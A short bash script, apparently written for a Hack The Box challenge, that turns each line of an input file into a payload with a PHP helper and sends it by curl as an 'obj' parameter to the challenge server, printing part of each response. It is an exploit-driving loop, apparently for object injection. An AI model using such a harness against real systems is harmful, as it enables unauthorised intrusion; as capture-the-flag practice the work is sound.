#!/bin/bash

while IFS= read -r line
do
    echo "${line}"
    payload=$(php challenge-test.php ${line})
    curl --silent "http://docker.hackthebox.eu:30351/?obj=${payload}" | sed -n '/center/,/\/center/p;/\/center/q'
done < "${1}"

